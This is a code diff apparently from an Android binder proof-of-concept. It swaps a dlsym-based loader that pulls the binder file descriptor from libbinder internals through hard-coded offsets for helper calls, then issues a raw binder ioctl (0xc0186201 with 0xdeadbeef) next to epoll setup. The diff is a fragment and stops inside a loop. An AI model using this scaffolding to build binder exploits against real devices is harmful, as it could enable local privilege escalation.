@@ -4,6 +4,10 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 #include <vector>
+#include <string>
+
+#include "poc/include/binder_stub.h"
+#include "poc/include/Chelpers.h"
 
 using namespace android;
 using namespace demo_api;
@@ -96,54 +100,6 @@ void list_available_services(sp<IServiceManager> sm)
     }
 }
 
-#define PROCESSSTATE_SELF       "_ZN7android12ProcessState4selfEv"
-#define DEFAULTSERVICEMANAGER   "_ZN7android21defaultServiceManagerEv"
-
-// interface variables
-int mDriverFD = 0;
-int mHandle = 0;
-
-// loader variables
-void* libbinder = 0;
-void* (*processstate_self_f)(size_t*) = 0;
-void* processstate_self = 0;
-void* (*defaultservicemanager_f)(size_t*) = 0;
-void* defaultservicemanager = 0;
-
-#include <dlfcn.h>
-
-int init_binderglobs()
-{
-    int result = -1;
-    // these actually hold the value, but so does the deref
-    size_t processstate_self_tmp = 0;
-    size_t defaultServiceManager_tmp = 0;
-    void* remote_tmp = 0;
-
-    if (libbinder == 0)
-    {
-        libbinder = dlopen("libbinder.so", RTLD_NOW);
-
-        processstate_self_f = (void* (*)(size_t*))dlsym(libbinder, PROCESSSTATE_SELF);
-        SAFE_PAIL(processstate_self_f == 0, "couldn't find " PROCESSSTATE_SELF);
-        processstate_self = processstate_self_f(&processstate_self_tmp);
-        processstate_self = *(void**)processstate_self;
-
-        defaultservicemanager_f = (void* (*)(size_t*))dlsym(libbinder, DEFAULTSERVICEMANAGER);
-        SAFE_PAIL(defaultservicemanager_f == 0, "couldn't find " DEFAULTSERVICEMANAGER);
-        defaultservicemanager = defaultservicemanager_f(&defaultServiceManager_tmp);
-        defaultservicemanager = *(void**)defaultservicemanager;
-
-        mDriverFD = *(int*)(((size_t)processstate_self) + 4);
-        remote_tmp = *(void**)(((size_t)defaultservicemanager) + 8);
-        mHandle = *(int*)(((size_t)remote_tmp) + 4);
-    }
-
-    result = 0;
-fail:
-    return result;
-}
-
 int main(int argc, char *argv[])
 {
     sp<IBinder> binder;
@@ -159,10 +115,18 @@ int main(int argc, char *argv[])
     unsigned long argup = 0;
     void *ptr = 0;
     struct epoll_event event = {.events = EPOLLIN};
+    std::vector<std::wstring> servlist;
 
     // list_available_services(sm);
-    fd = *(int*)(*((void**)&proc) + 4);
+    getfd(&fd);
     epfd = epoll_create(1000);
+
+    ioctl(fd, 0xc0186201, 0xdeadbeef);
+    listServices(0);
+    ioctl(fd, 0xc0186201, 0xdeadbeef);
+
+    // listServices(&servlist);
+    list_available_services(sm);
 
     do{
         //Search service by SERVICE_NAME, instigates a write IOCTL
